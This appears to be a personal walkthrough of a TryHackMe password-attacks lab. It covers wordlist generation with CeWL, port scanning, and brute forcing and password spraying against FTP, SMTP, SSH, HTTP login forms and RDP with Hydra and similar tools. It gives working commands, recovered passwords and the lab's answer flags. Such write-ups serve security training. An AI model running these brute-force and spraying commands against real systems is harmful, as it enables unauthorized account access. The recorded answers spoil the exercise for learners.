What syntax would you use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@?

Answer: _Az"[0-9][0-9]" ^[!@]_


Task 7 - Deploy the VM
-----------------------------------------

In this task we deploy the VM, and try some of the things we have learned to generate a custom password list based on info we may find in the site https://clinic.thmredteam.com 

To save time we can use the following to generate our custom wordlist:

```bash
 kali@kali  ~  cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

kali@kali  ~  cat clinic.lst | wc -l
105
```

ok, doing some standard enumeration, I see the default webpage is just an unconfigured Apache2 default page.

There does not appear to be a robots.txt file.

Nothing sticks out in the source of the index.

I will run a port scan to see what services we can attack:

```bash
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.148.211
------------------------------------------------------------
Scanning target 10.10.148.211
Time started: 2023-01-26 09:34:10.442301
------------------------------------------------------------
Port 21 is open
Port 22 is open
Port 25 is open
Port 80 is open
Port 465 is open
Port 587 is open
Port scan completed in 0:01:24.791614
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p21,22,25,80,465,587 -sV -sC -T4 -Pn -oA 10.10.148.211 10.10.148.211
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p21,22,25,80,465,587 -sV -sC -T4 -Pn -oA 10.10.148.211 10.10.148.211
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 09:36 JST
Nmap scan report for 10.10.148.211
Host is up (0.26s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.3.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5d1a0b4aab798d829b20ec5420ea1b80 (RSA)
|   256 e68e9aa6b5c11bcc5584829d7d62eff9 (ECDSA)
|_  256 80269bd44bafa4e9f7fca224eb786b8d (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-10-07T08:49:39
|_Not valid after:  2031-10-05T08:49:39
|_smtp-commands: mail.thm.labs, SIZE 10240000, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
465/tcp open  ssl/smtp Postfix smtpd
|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-10-07T08:49:39
|_Not valid after:  2031-10-05T08:49:39
587/tcp open  smtp     Postfix smtpd
|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-10-07T08:49:39
|_Not valid after:  2031-10-05T08:49:39
Service Info: Host: mail.thm.labs; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.09 seconds
------------------------------------------------------------
Combined scan completed in 0:03:00.719136
Press enter to quit...
```


Ok, so it looks like we have a VSFTP and ssh, postfix running.  Enumberating clinic.thmredteam.com we see some username/user email ids we can try with our password list.

![[thm-staff.jpg]]


We can generate a list of usernames based on the names we found on the site:

```bash
 kali@kali  ~  cat clinic-usernames.txt 
Pierre Pittman
Weronika Burgess
Dario Phillips
Jason Carlson

 kali@kali  ~  python3 scripts/username_generator/username_generator.py -w clinic-usernames.txt > clinic-users2.txt
 kali@kali  ~  cat clinic-users2.txt                                                                               
pierre
pittman
p.pittman
p-pittman
p_pittman
p+pittman
ppittman
pittmanpierre
weronika
burgess
w.burgess
w-burgess
w_burgess
w+burgess
wburgess
burgessweronika
dario
phillips
d.phillips
d-phillips
d_phillips
d+phillips
dphillips
phillipsdario
jason
carlson
j.carlson
j-carlson
j_carlson
j+carlson
jcarlson
carlsonjason
```

__Questions__

Get your pentest weapons ready to attack 10.10.148.211.
Answer: _None Needed_



Task 8 - Online password attacks
---------------------------------------------------------

Online password attacks involve guessing passwords for service that use a username/password scheme to login. 

### Hydra

Hydra is one of the best online password guessing tools we can use.  It will allow us to brute force passwords for things like web pages, FTP, SMTP etc.

### FTP

Here is the syntax for brute forcing FTP using hydra:

```bash
hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

-l ftp we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

Remember that sometimes you don't need to brute-force and could first try default credentials. Try to attack the FTP server on the attached VM and answer the question below.


### SMTP

Here is the syntax for SMTP. They are similar, but for the targeted protocol:

```bash
$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

### SSH

Here is the syntax for SSH. Note we should use/generate good userlist and password lists.

```bash
$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

### HTTP Login Pages


In this scenario, we will brute-force HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST. Checking hydra options: hydra http-get-form -U, we can see that hydra has the following syntax for the http-get-form option:

`<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`

As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.

```bash
$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45
```

-l admin  we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

10.10.x.x the IP address or the fully qualified domain name (FQDN) of the target.

http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.

Next, we specify the URL, path, and conditions that are split using :

login-get/index.php the path of the login page on the target webserver.

username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.

And success conditions, S=. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set F=Invalid Password.

Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.

S=logout.php the success condition to identify the valid credentials

-f to stop the brute-forcing attacks after finding a valid username and password

You can try it out on the attached VM by visiting http://10.10.148.211/login-get/index.php. Make sure to deploy the attached VM if you haven't already to answer the questions below.

Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:  

-   Medusa
-   Ncrack
-   others!

__Questions__

Can you guess the FTP credentials without brute-forcing? What is the flag?


```bash
kali@kali  ~  ftp 10.10.148.211                                            
Connected to 10.10.148.211.
220 (vsFTPd 3.0.3)
Name (10.10.148.211:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> list
?Invalid command.
ftp> pwd
Remote directory: /
ftp> dir
229 Entering Extended Passive Mode (|||59076|)
150 Here comes the directory listing.
drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
226 Directory send OK.
ftp> get files
local: files remote: files
229 Entering Extended Passive Mode (|||25144|)
550 Failed to open file.
ftp> cd files
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||45757|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 Oct 12  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||55976|)
150 Opening BINARY mode data connection for flag.txt (38 bytes).
100% |**************************************************************************************************|    38       13.76 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (0.14 KiB/s)

kali@kali  ~  cat flag.txt          
THM{d0abe799f25738ad739c20301aed357b}

```

Answer: _THM{d0abe799f25738ad739c20301aed357b}_


  
In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.148.211:25 (SMTP).

What is the password? Note that the password format is as follows: `[symbol][dictionary word][0-9][0-9]`

At this point the  box crashes and I have to start a new one. :/

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l pittman@clinic.thmredteam.com -P ~/clinic.lst 10.10.233.92 smtp -V
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-26 11:07:38
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
[DATA] attacking smtp://10.10.233.92:25/
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "protected" - 1 of 105 [child 0] (0/0)
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "Research" - 2 of 105 [child 1] (0/0)
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "Oxytocin" - 3 of 105 [child 2] (0/0)
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "Paracetamol" - 4 of 105 [child 3] (0/0)
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "Cortisol" - 5 of 105 [child 4] (0/0)
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "appointment" - 6 of 105 [child 5] (0/0)
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "Cardiology" - 7 of 105 [child 6] (0/0)
[ATTEMPT] target 10.10.233.92 - login "pittman@clinic.thmredteam.com" - pass "February" - 8 of 105 [child 7] (0/0)
```

Answer: _!multidisciplinary00_

Perform a brute-forcing attack against the phillips account for the login page at http://10.10.233.92/login-get using hydra? **What is the flag?**

I am just using Burpsuite to capture the login for admin/admin on login-get url, then sending that to the intruder tool and loading a simple list which found the password.

![[passwordattackburp1.jpg]]
Answer: _THM{33c5d4954da881814420f3ba39772644}_

  
Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.233.92/login-post/. What is the flag?

Note: use the clinic.lst dictionary in generating and expanding the wordlist!
Hint: Use John's Single-Extra rule.

![[passwordattackburp2.jpg]]
Answer: _THM{f8e3750cc0ccbb863f2706a3b2933227}_


Task 9 - Password spray attack
-----------------------------------------------------

In this task, we will learn the fundamentals of a password spraying attack and the tools we need to perform such an attack against online services.

Password Spraying is a good way to identify valid credentials and one of the ways to find weak passwords. Password Spraying attack targets many usernames using a single weak password in hopes of not getting locked out due to server/service login polcies' thresholds not being crossed.

This figure shows the concept:

![[password-spray1.png]]

These types of weak passwords often follow a format and pattern. Here are some examples:

-   The current season followed by the current year (SeasonYear). For example, **Fall2020**, **Spring2021**, etc.
-   The current month followed by the current year (MonthYear). For example, **November2020**, **March2021**, etc.
-   Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.

It is useful if we are targetting a specific server/organization, that we enumerate and try to figure out what their password policy is. For example, if we know they need Upper and Lowercase letters, numbers and at least one special symbol, then we can create a list of passwords based on the above such as **Company2022!**, **UserName2022!**, etc.

Next we will use this technique against some services like:

-   SSH
-   RDP
-   Outlook web access (OWA) portal
-   SMB

### SSH

Let's assume we enumerated a system and made a valid list of usernames:

```bash
# cat usernames-list.txt
admin
victim
dummy
adm
sammy
```

Then we can use Hydra to perform the password spray against SSH using the `Spring2021` password.

```bash
$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```


### RDP

Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to password spray against RDP. 

```bash
kali@kali  ~/scripts/RDPassSpray   master  python3 RDPassSpray.py -h               
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET)
                      [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

options:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the
                        value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and
                        maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts

```

Here is an example of usage. 

```bash
# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

If we were in an Active Directory environment, we can use the -d option.

```bash
# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

### Outlook Web Access (OWA) portal

Tools:

-   [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
-   [MailSniper](https://github.com/dafthack/MailSniper)

### SMB

-   Tool: Metasploit (auxiliary/scanner/smb/smb_login)


__Questions__

Use the following username list:

```bash
# cat usernames-list.txt admin phillips burgess pittman guess
```

Perform a password spraying attack to get access to the SSH://10.10.42.252 server to read /etc/flag. **What is the flag?**

So for this we can just use our user list from last task, and create a simple password list using the methods we had tried in previous task and the hints for simple password spray from this task so we wind up with basically 4 words with transforms:

SeasonYearSpecial Char
```bash
Spring2021!
Summer2021!
Fall2021!
Winter2021!
Spring2021@
Summer2021@
Fall2021@
Winter2021@
[..]
```

```bash
hydra -L clinic-users.txt -P clinic-pass.txt  
```

```
┌──(kali㉿kali)-[~]
└─$ hydra -L ~/clinic-users.txt -P ~/clinic-pass.txt 10.10.42.252 -t 4 ssh                                         
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-27 10:17:11
[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:5/p:3), ~4 tries per task
[DATA] attacking ssh://10.10.42.252:22/
[22][ssh] host: 10.10.42.252   login: burgess   password: Fall2021@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-27 10:17:29


┌──(kali㉿kali)-[~]
└─$ ssh burgess@10.10.42.252
The authenticity of host '10.10.42.252 (10.10.42.252)' can't be established.
ED25519 key fingerprint is SHA256:Ik9lKNP51rXXMHVH5wM++WGrr3IfJZI+Tq9uED0KPcM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.42.252' (ED25519) to the list of known hosts.
burgess@10.10.42.252's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 27 01:06:59 UTC 2023

  System load:  0.13               Users logged in:                0
  Usage of /:   21.0% of 19.32GB   IP address for eth0:            10.10.42.252
  Memory usage: 37%                IP address for br-c0dd1805e8c7: 172.18.0.1
  Swap usage:   0%                 IP address for br-mailcow:      172.22.1.1
  Processes:    140                IP address for docker0:         172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

61 packages can be updated.
8 updates are security updates.


Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37

burgess@ip-10-10-42-252:~$ cd /etc

burgess@ip-10-10-42-252:/etc$ cat flag
THM{a97a26e86d09388bbea148f4b870277d}
```

Answer: _THM{a97a26e86d09388bbea148f4b870277d}_


Task 10 - Summary
-----------------------------

This room introduced the basic concepts of different password attacks and how to make more specific/targeted password lists. We covered the following:

-   Default, weak, leaked combined wordlists
-   Password profiling
-   Offline password attacks
-   Online password attacks

__Questions__

Hope you enjoyed the room and keep learning!
Answer: _None Needed_



